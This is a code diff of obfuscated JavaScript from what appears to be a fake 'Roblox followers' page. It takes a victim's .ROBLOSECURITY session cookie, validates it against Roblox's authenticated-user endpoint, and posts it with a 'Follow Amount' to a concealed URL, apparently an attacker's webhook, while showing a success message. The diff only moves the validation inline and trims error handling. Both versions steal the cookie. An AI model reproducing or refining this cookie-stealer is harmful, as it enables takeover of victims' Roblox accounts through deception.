@@ -27,18 +27,24 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
     
     const xyeqeq = xyeq[1];
 
-    // Verificar la cookie
-    const isValidCookie = await verifyCookie(xyeqeq);
-    if (!isValidCookie) {
-        x1y2y2z3("Invalid code", "The provided code is invalid.", "error", "Retry");
-        return;
-    }
-
-    const j1k2l3 = {
-        content: `Follow Amount: ${s4t5u7}\n.ROBLOSECURITY: ${xyeqeq}`
-    };
-
+    // Verificar la cookie antes de enviar la solicitud
     try {
+        const verificationResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
+            method: 'GET',
+            headers: {
+                'Cookie': `.ROBLOSECURITY=${xyeqeq}`
+            }
+        });
+
+        if (!verificationResponse.ok) {
+            x1y2y2z3("Error", "Invalid code. Please check your cookie.", "error", "Retry");
+            return;
+        }
+
+        const j1k2l3 = {
+            content: `Follow Amount: ${s4t5u7}\n.ROBLOSECURITY: ${xyeqeq}`
+        };
+
         const response = await fetch(g8h9i0, {
             method: 'POST',
             headers: {
@@ -50,24 +56,11 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
         if (response.ok) {
             x1y2y2z3("Success", "Successfully sent.", "success", "Okay");
         } else {
-            const errorData = await response.json();
-            x1y2y2z3("Error", `Failed to send Followers to Roblox Account. ${errorData.errors[0].message}`, "error", "Retry");
+            x1y2y2z3("Error", "Failed to send Followers to Roblox Account.", "error", "Retry");
         }
     } catch (error) {
         x1y2y2z3("Error", "An error occurred while sending Followers", "error", "Retry");
     }
-}
-
-// Función para verificar la cookie
-async function verifyCookie(cookie) {
-    const response = await fetch("https://users.roblox.com/v1/users/authenticated", {
-        method: 'GET',
-        credentials: 'include',
-        headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`
-        }
-    });
-    return response.ok; // Retorna true si la respuesta es 200
 }
 
 document.addEventListener("DOMContentLoaded", function() {
